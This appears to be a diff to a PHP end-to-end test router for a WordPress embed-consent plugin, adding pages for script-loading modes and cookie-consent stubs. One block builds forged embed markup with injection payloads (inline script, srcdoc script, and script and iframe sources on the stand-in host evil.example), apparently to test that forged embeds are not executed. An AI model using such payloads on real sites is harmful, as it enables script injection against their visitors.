@@ -98,6 +98,33 @@ if ( '/page/poster-mismatch' === $uri ) {
 	return true;
 }
 
+if ( '/page/forged' === $uri || '/page/forged-memory' === $uri ) {
+	// What a Contributor can save: WordPress's kses keeps class and data-*
+	// on every tag and allows div and button, so the 0.x panel markup —
+	// payload in an attribute — was forgeable verbatim. Three forgeries,
+	// one per executable payload shape, next to one real embed so gate.js
+	// is on the page. None of them carries the one thing kses never lets
+	// through: the <script type="application/json"> payload element.
+	$forge = static function ( string $id, string $payload ): string {
+		return '<div class="cg-embed" role="group" aria-label="Forged ' . $id . '" data-cg-provider="youtube" data-cg-host="www.youtube-nocookie.com" data-cg-payload=\'' . $payload . '\' id="forged-' . $id . '">'
+			. '<div class="cg-embed__panel"><p class="cg-embed__note">Forged.</p><button type="button" class="cg-embed__button">Load forged ' . $id . '</button>'
+			. '<p class="cg-embed__fallback"><a href="https://www.youtube.com/watch?v=AbCdEfGhIjK" rel="noopener nofollow">Open</a></p></div></div>';
+	};
+	$content = implode(
+		"\n",
+		array(
+			'<iframe title="Real" width="500" height="281" src="https://www.youtube.com/embed/y_pjE_p1HwE" frameborder="0"></iframe>',
+			$forge( 'inline', '{"strategy":"script","inline":"window.__pwned = \\"inline\\";"}' ),
+			$forge( 'srcdoc', '{"srcdoc":"<script>parent.__pwned = \\"srcdoc\\";</script>","attrs":{}}' ),
+			$forge( 'script', '{"strategy":"script","src":"https://evil.example/x.js"}' ),
+			$forge( 'iframe', '{"src":"https://evil.example/frame","attrs":{"title":"forged"}}' ),
+		)
+	);
+
+	cg_e2e_page( $content, '', '/page/forged-memory' === $uri ? 'window.caluconEmbedGateConfig = { memory: "persistent", scope: "all" };' : '' );
+	return true;
+}
+
 if ( '/page/gated' === $uri ) {
 	// Raw content as WordPress would render it, before gating: one embed per
 	// authoring style from the fixture corpus, plus a same-origin iframe that
@@ -176,6 +203,36 @@ if ( '/page/memory-persistent' === $uri ) {
 		$content,
 		'',
 		'window.caluconEmbedGateConfig = {"memory":"persistent","scope":"all","durationDays":1};'
+	);
+	return true;
+}
+
+// Caching and minification plugins reshape how scripts reach the browser:
+// they defer them, load them async, combine them into a bundle that runs long
+// after DOMContentLoaded, or reorder an inline block past the file it belongs
+// to. gate.js has to keep working through all of it, so each shape gets a page.
+foreach ( array( 'defer', 'async', 'late', 'delayed' ) as $cg_mode ) {
+	if ( '/page/loading-' . $cg_mode === $uri ) {
+		$content = '<iframe title="Video" width="500" height="281" src="https://www.youtube.com/embed/y_pjE_p1HwE" frameborder="0"></iframe>';
+		cg_e2e_page( $content, '', '', array(), '', null, $cg_mode );
+		return true;
+	}
+}
+
+if ( '/page/loading-config-after' === $uri ) {
+	// A script combiner can emit the inline config AFTER gate.js. Consent
+	// memory is what depends on that config being readable at load, so this
+	// page mirrors /page/memory exactly, with only the order changed.
+	$content = '<iframe title="Video" width="500" height="281" src="https://www.youtube.com/embed/y_pjE_p1HwE" frameborder="0"></iframe>';
+
+	cg_e2e_page(
+		$content,
+		'',
+		'window.caluconEmbedGateConfig = {"memory":"session","scope":"provider","durationDays":180};',
+		array(),
+		'',
+		null,
+		'config-after'
 	);
 	return true;
 }
@@ -485,24 +542,40 @@ if ( 0 === strpos( $uri, '/page/cmp-' ) ) {
 				. 'window.__cmpGrant = function () { cgGranted = true; window.dispatchEvent(new CustomEvent("borlabs-cookie-consent-saved")); };'
 				. 'window.__cmpRevoke = function () { cgGranted = false; window.dispatchEvent(new CustomEvent("borlabs-cookie-consent-saved")); };',
 		),
+		// RCB with a content blocker governing the embeds: unblockSync()
+		// returns the matched blocker, unblock() resolves after consent.
 		'rcb'            => array(
 			'config' => array( 'adapter' => 'real-cookie-banner', 'category' => 'marketing' ),
 			'stub'   => 'var cgResolvers = [];'
-				. 'window.consentApi = { unblock: function (url) { return new Promise(function (resolve) { cgResolvers.push(resolve); }); } };'
+				. 'window.consentApi = { wrapFn: function () {}, unblockSync: function (url) { return { blocker: 1 }; }, consentSync: function (sel) { return { cookie: { id: 1 }, consentGiven: false }; }, unblock: function (url) { return new Promise(function (resolve) { cgResolvers.push(resolve); }); } };'
 				. 'window.__cmpGrant = function () { var r = cgResolvers; cgResolvers = []; for (var i = 0; i < r.length; i++) { r[i](); } };',
 		),
-		'tcf'            => array(
-			'config' => array(
-				'adapter'  => null,
-				'category' => 'marketing',
-				'tcf'      => array( 'vendors' => array( 'youtube' => 755, 'google-maps' => 755 ) ),
-			),
-			'stub'   => 'var cgListeners = []; var cgCurrent = null;'
-				. 'window.__tcfapi = function (command, version, callback) {'
-				. ' if (command === "addEventListener") { cgListeners.push(callback); if (cgCurrent) { callback(cgCurrent, true); } } };'
-				. 'function cgPush(data) { cgCurrent = data; for (var i = 0; i < cgListeners.length; i++) { cgListeners[i](data, true); } }'
-				. 'window.__cmpGrant = function () { cgPush({ eventStatus: "useractioncomplete", gdprApplies: true, purpose: { consents: { 1: true } }, vendor: { consents: { 755: true } } }); };'
-				. 'window.__cmpRevoke = function () { cgPush({ eventStatus: "useractioncomplete", gdprApplies: true, purpose: { consents: { 1: false } }, vendor: { consents: { 755: false } } }); };',
+		// RCB with NO blocker for these URLs — the shape of a plain install
+		// (measured against RCB 5.3): unblockSync() is undefined, consentSync
+		// reports cookie null, and unblock() resolves at once. Must stay gated.
+		'rcb-noblocker'  => array(
+			'config' => array( 'adapter' => 'real-cookie-banner', 'category' => 'marketing' ),
+			'stub'   => 'window.consentApi = { wrapFn: function () {}, unblockSync: function (url) { return undefined; }, consentSync: function (sel) { return { cookie: null, consentGiven: false, cookieOptIn: true }; }, unblock: function (url) { return Promise.resolve(); } };',
+		),
+		// RCB as it really loads: its pre-load STUB first (unblockSync →
+		// undefined, unblock() queued on a "consentApi" window event), the
+		// real API only after the page has loaded, then the announcement.
+		// The bridge must neither decide on the stub nor miss the real one.
+		'rcb-late'       => array(
+			'config' => array( 'adapter' => 'real-cookie-banner', 'category' => 'marketing' ),
+			'stub'   => '((a,b)=>{a[b]||(a[b]={unblockSync:()=>undefined},["consentSync"].forEach(c=>a[b][c]=()=>({cookie:null,consentGiven:!1,cookieOptIn:!0})),["consent","consentAll","unblock"].forEach(c=>a[b][c]=(...d)=>new Promise(e=>a.addEventListener(b,()=>{a[b][c](...d).then(e)},{once:!0}))))})(window,"consentApi");'
+				. 'var cgResolvers = [];'
+				. 'window.addEventListener("load", function () { setTimeout(function () {'
+				. ' window.consentApi = { wrapFn: function () {}, unblockSync: function (url) { return { blocker: 1 }; }, consentSync: function (sel) { return { cookie: { id: 1 }, consentGiven: false }; }, unblock: function (url) { return new Promise(function (resolve) { cgResolvers.push(resolve); }); } };'
+				. ' window.dispatchEvent(new CustomEvent("consentApi"));'
+				. '}, 300); });'
+				. 'window.__cmpGrant = function () { var r = cgResolvers; cgResolvers = []; for (var i = 0; i < r.length; i++) { r[i](); } };',
+		),
+		// An older RCB without the sync lookups: nothing to confirm the URL
+		// is governed, so an immediately-resolving unblock() must not grant.
+		'rcb-legacy'     => array(
+			'config' => array( 'adapter' => 'real-cookie-banner', 'category' => 'marketing' ),
+			'stub'   => 'window.consentApi = { unblock: function (url) { return Promise.resolve(); } };',
 		),
 	);
 
@@ -528,9 +601,48 @@ if ( 0 === strpos( $uri, '/page/cmp-' ) ) {
  * @param string $config_js     Inline config (what wp_add_inline_script emits).
  * @param array  $extra_ctx     Extra integration context (e.g. §5.4 poster).
  * @param string $extra_scripts Raw script tags after gate.js (CMP stubs + bridge).
+ * @param string $gate_mode     How gate.js is delivered, simulating what a
+ *                              caching/minification plugin does to it:
+ *                              '' (normal), 'defer', 'async', 'late' (injected
+ *                              after DOMContentLoaded has fired) or
+ *                              'config-after' (the inline config emitted after
+ *                              gate.js instead of before it, as a script
+ *                              combiner can reorder them).
  * @return void
  */
-function cg_e2e_page( string $content, string $extra_css = '', string $config_js = '', array $extra_ctx = array(), string $extra_scripts = '', ?array $providers = null ) {
+function cg_e2e_gate_tag( string $mode ): string {
+	if ( 'defer' === $mode || 'async' === $mode ) {
+		return '<script ' . $mode . ' src="/assets/gate.js"></script>';
+	}
+	if ( 'delayed' === $mode ) {
+		// What "delay JavaScript until interaction" does: nothing loads until
+		// the visitor touches the page, and the interaction that lifts the delay
+		// is consumed doing so. Modelled the way WP Rocket does it — a capture
+		// listener that removes itself and then injects the real script.
+		return '<script>(function () {'
+			. 'function cgLift() {'
+			. 'document.removeEventListener("click", cgLift, true);'
+			. 'var s = document.createElement("script");'
+			. 's.src = "/assets/gate.js";'
+			. 'document.body.appendChild(s);'
+			. '}'
+			. 'document.addEventListener("click", cgLift, true);'
+			. '}());</script>';
+	}
+	if ( 'late' === $mode ) {
+		// Later than any real optimizer would, on purpose: a combiner or a
+		// "delay JS until interaction" feature can run gate.js long after
+		// DOMContentLoaded, and the delegated click listener has to survive it.
+		return '<script>window.addEventListener("load", function () {'
+			. 'var s = document.createElement("script");'
+			. 's.src = "/assets/gate.js";'
+			. 'document.body.appendChild(s);'
+			. '});</script>';
+	}
+	return '<script src="/assets/gate.js"></script>';
+}
+
+function cg_e2e_page( string $content, string $extra_css = '', string $config_js = '', array $extra_ctx = array(), string $extra_scripts = '', ?array $providers = null, string $gate_mode = '' ) {
 	$gated = PipelineFactory::gate(
 		$content,
 		array( '127.0.0.1', 'localhost' ),
@@ -550,8 +662,9 @@ function cg_e2e_page( string $content, string $extra_css = '', string $config_js
 		. '<main><h1>Calucon Third-Party Embed Gate E2E</h1>'
 		. $gated
 		. '</main>'
-		. ( '' !== $config_js ? '<script>' . $config_js . '</script>' : '' )
-		. '<script src="/assets/gate.js"></script>'
+		. ( '' !== $config_js && 'config-after' !== $gate_mode ? '<script>' . $config_js . '</script>' : '' )
+		. cg_e2e_gate_tag( $gate_mode )
+		. ( '' !== $config_js && 'config-after' === $gate_mode ? '<script>' . $config_js . '</script>' : '' )
 		. $extra_scripts
 		. '</body></html>';
 }
